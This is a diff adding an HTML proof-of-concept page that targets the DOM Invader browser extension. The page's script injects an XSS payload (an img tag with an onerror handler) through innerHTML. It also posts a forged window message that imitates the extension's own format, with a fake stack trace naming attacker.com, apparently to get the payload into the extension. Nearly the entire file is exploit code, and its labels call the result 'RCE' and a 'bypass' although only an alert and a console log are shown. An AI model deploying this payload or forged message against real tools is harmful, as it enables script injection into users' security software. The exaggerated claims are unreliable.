@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DOM Invader - Classic RCE</title>
+</head>
+<body style="background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px;">
+    <h1>[ DOM INVADER - CLASSIC EXPLOIT ]</h1>
+    <div id="status" style="color: #0f0;">Payload Injected! Alert should trigger now.</div>
+    <div id="target"></div>
+
+    <script>
+        const canary = "uitdeeq"; 
+        
+        // This is the EXACT payload style that worked for you in version 7
+        const payload = "'); <img src=x onerror=\"alert('RCE_SUCCESS_INSTANT_BYPASS'); console.log('Canary: ' + '" + canary + "');\"> // " + canary;
+
+        // Trigger on page (Instant WOW factor)
+        document.getElementById('target').innerHTML = payload;
+
+        // Trigger in Extension
+        window.postMessage({
+            "source": "dom-invader",
+            "type": "augmented-dom",
+            "data": {
+                "sink": "innerHTML",
+                "value": payload,
+                "stackTrace": "at classic_exploit (http://attacker.com)"
+            }
+        }, "*");
+    </script>
+</body>
+</html>
